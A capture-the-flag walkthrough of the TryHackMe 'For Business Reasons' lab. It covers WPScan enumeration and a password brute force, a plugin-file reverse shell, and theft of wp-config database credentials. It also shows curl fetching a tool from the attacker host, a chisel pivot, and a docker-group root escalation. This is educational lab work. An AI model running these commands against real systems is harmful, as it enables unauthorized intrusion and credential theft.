---
categories: [TryHackMe]
tags: [Chisel, Pivoting, Wordpress, Docker, PrivEsc]  
media_subpath: /Vulnhub-Files/img/
image:
  path: For%20Bussiness%20Reason/Untitled.png
  alt: TryHackMe For Bussiness Reason Machine 🐉
---

## Description ⤵️

This machine is *<kbd>For Bussiness Reasons</kbd>* , It is from TryHackMe Platform and categorized as Medium machine . This Machine is based on Pivoting .

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.61.57
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 21:22 IST
Nmap scan report for 10.10.61.57
Host is up (0.21s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.4.2
|_http-title: MilkCo Test/POC site &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
2377/tcp closed swarm
7946/tcp closed unknown
```
{: .nolineno}
{: .nolineno}

## Web Enumeration ⤵️

I loaded the port 80 and I got a wordpress site so I immediatly used the WPScan Tool for it →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]
└─$ wpscan --url http://10.10.61.57/ -e u,p,t
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         'WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.61.57/ [10.10.61.57]
[+] Started: Fri Nov  3 21:24:12 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.38 (Debian)
 |  - X-Powered-By: PHP/7.2.34
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.61.57/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.61.57/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.61.57/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.61.57/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.61.57/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.61.57/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)

[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://10.10.61.57/wp-content/themes/twentynineteen/
 | Last Updated: 2023-10-23T00:00:00.000Z
 | Readme: http://10.10.61.57/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://10.10.61.57/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.61.57/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.61.57/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'

[+] twentyseventeen
 | Location: http://10.10.61.57/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-10-23T00:00:00.000Z
 | Readme: http://10.10.61.57/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.61.57/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.61.57/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.61.57/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'

[+] twentytwenty
 | Location: http://10.10.61.57/wp-content/themes/twentytwenty/
 | Last Updated: 2023-10-23T00:00:00.000Z
 | Readme: http://10.10.61.57/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.10.61.57/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.61.57/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.61.57/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <> (0 / 10)  0.00%   Brute Forcing Author IDs - Time: 00:00:01 <> (1 / 10) 10.00%   Brute Forcing Author IDs - Time: 00:00:01 <> (2 / 10) 20.00%   Brute Forcing Author IDs - Time: 00:00:01 <> (3 / 10) 30.00%   Brute Forcing Author IDs - Time: 00:00:01 <> (4 / 10) 40.00%   Brute Forcing Author IDs - Time: 00:00:03 <> (5 / 10) 50.00%   Brute Forcing Author IDs - Time: 00:00:03 <> (8 / 10) 80.00%   Brute Forcing Author IDs - Time: 00:00:04 <> (9 / 10) 90.00%   Brute Forcing Author IDs - Time: 00:00:04 <> (10 / 10) 100.00% Time: 00:00:04

[i] User(s) Identified:

[+] sysadmin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.61.57/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```
{: .nolineno}
{: .nolineno}

Now I got a username as sysadmin and with this Tool only I tried to bruteforced the password for wordpress login →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]
└─$ wpscan --url http://10.10.61.57/ -U sysadmin -P /usr/share/wordlists/rockyou.txt     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         'WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.61.57/ [10.10.61.57]
[+] Started: Fri Nov  3 21:31:46 2023
...
...

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - sysadmin / milkshake                                                                                               
Trying sysadmin / kenzie Time: 00:06:25 <                                             > (1665 / 14346057)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: sysadmin, Password: milkshake
```
{: .nolineno}
{: .nolineno}

I have the credentials now so lets login into the wordpress site and upload the reverse shell in Themes or Plugins php file and update that files and load the URLs to gain a reverse shell →

![Untitled](For%20Bussiness%20Reason/Untitled%201.png)

I loaded this plugin URL to get the reverse shell response →

```bash
https://10.10.128.95/wp-content/plugins/hello.php
```
{: .nolineno}
{: .nolineno}

After getting the shell I accessed the wp-config.php file that contains the database credentails →

```bash
wp-config.php >>

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb');

/** MySQL database username */
define( 'DB_USER', 'wpdbuser');

/** MySQL database password */
define( 'DB_PASSWORD', 'Ceixahz5');

/** MySQL hostname */
define( 'DB_HOST', 'db');

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8');

/** The Database Collate type. Do not change this if in doubt. */
define( 'DB_COLLATE', '');
```
{: .nolineno}
{: .nolineno}

As I tried but no commands are working so I tried to see the IP addresses with this command →

```bash
www-data@8f5f60739296:/$ hostname -I
hostname -I
10.0.0.3 172.18.0.3 10.255.0.4 
www-data@8f5f60739296:/$
```
{: .nolineno}
{: .nolineno}

I got 3 IP addresses so lets transfer the nmap to see what services are running in this IPs an I am inside a container so with curl Tool.

```bash
www-data@8f5f60739296:/tmp$ curl http://10.8.83.156:80/nmap -o nmap
curl http://10.8.83.156:80/nmap -o nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2775k  100 2775k    0     0  1213k      0  0:00:02  0:00:02 --:--:-- 1212k
www-data@8f5f60739296:/tmp$ ls -al
ls -al
total 2788
drwxrwxrwt 1 root     root        4096 Nov  5 09:17 .
drwxr-xr-x 1 root     root        4096 Nov  5 08:41 ..
-rw-rw-rw- 1 www-data www-data 2842096 Nov  5 09:17 nmap
drwxr-xr-x 5 root     root        4096 Nov 19  2020 pear
www-data@8f5f60739296:/tmp$ chmod +x nmap
chmod +x nmap
www-data@8f5f60739296:/tmp$
```
{: .nolineno}
{: .nolineno}

I scan the network `172.18.0.3/24` and I got the IP `172.18.0.1` which have port 80,22 open so I used chisel Tool to do the pivoting →

![Untitled](For%20Bussiness%20Reason/Untitled%202.png)

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/For_Bussiness_Reasons]
└─$ sudo ssh sysadmin@127.0.0.1 -p 1234
[sudo] password for kali: 
The authenticity of host '[127.0.0.1]:1234 ([127.0.0.1]:1234)' can not be established.
ED25519 key fingerprint is SHA256:U14271OTfB1vLbhGF52YlyhN4QwdxK/ukXix+l83+iI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:1234' (ED25519) to the list of known hosts.
sysadmin@127.0.0.1s password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

263 packages can be updated.
181 updates are security updates.

Last login: Sat Nov 21 15:30:19 2020
sysadmin@ubuntu:~$ whoami
sysadmin
sysadmin@ubuntu:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)
sysadmin@ubuntu:~$ ls -al
total 40
drwxr-xr-x 4 sysadmin sysadmin 4096 Nov 21  2020 .
drwxr-xr-x 3 root     root     4096 Aug  8  2020 ..
-rw-r--r-- 1 sysadmin sysadmin  220 Aug  8  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Aug  8  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Aug  8  2020 .cache
-rw------- 1 sysadmin sysadmin    9 Aug  8  2020 flag1.txt
drwxrwxr-x 2 sysadmin sysadmin 4096 Aug  8  2020 .nano
-rw-r--r-- 1 sysadmin sysadmin  655 Aug  8  2020 .profile
-rw-rw-r-- 1 sysadmin sysadmin   66 Aug  8  2020 .selected_editor
-rw-r--r-- 1 sysadmin sysadmin    0 Aug  8  2020 .sudo_as_admin_successful
-rw------- 1 sysadmin sysadmin  768 Aug  8  2020 .viminfo
sysadmin@ubuntu:~$ cat flag1.txt
FLAGFLAGFLAG
sysadmin@ubuntu:~$
```
{: .nolineno}
{: .nolineno}

Now for root access I see the id groups and I noticed docker and I checked the images and I exploit that and got the root →

```bash
sysadmin@ubuntu:/tmp$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)
sysadmin@ubuntu:/tmp$ 
sysadmin@ubuntu:/tmp$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
mysql               5.7                 ae0658fdbad5        2 years ago         449MB
wordpress           latest              cfb931188dab        2 years ago         546MB
wordpress           php7.2-apache       82f0034f8ebe        2 years ago         542MB
wordpress           <none>              d3bd49a68bba        3 years ago         539MB
mysql               <none>              718a6da099d8        3 years ago         448MB
sysadmin@ubuntu:/tmp$ docker run -v /:/mnt --rm -it mysql chroot /mnt sh
Unable to find image 'mysql:latest' locally
^C
sysadmin@ubuntu:/tmp$ docker run -v /:/mnt --rm -it wordpress chroot /mnt sh
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 44
drwx------  4 root root 4096 Nov 21  2020 .
drwxr-xr-x 24 root root 4096 Aug  8  2020 ..
-rw-------  1 root root   83 Nov 21  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Aug  9  2020 .cache
drwxr-xr-x  2 root root 4096 Aug  8  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   75 Aug  8  2020 .selected_editor
-rw-------  1 root root 6209 Nov 21  2020 .viminfo
-rw-r--r--  1 root root   17 Aug  8  2020 root.txt
# cat root.txt
FLAGFLAGFLAGFLAG
#
```
{: .nolineno}
{: .nolineno}

Now I am root !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }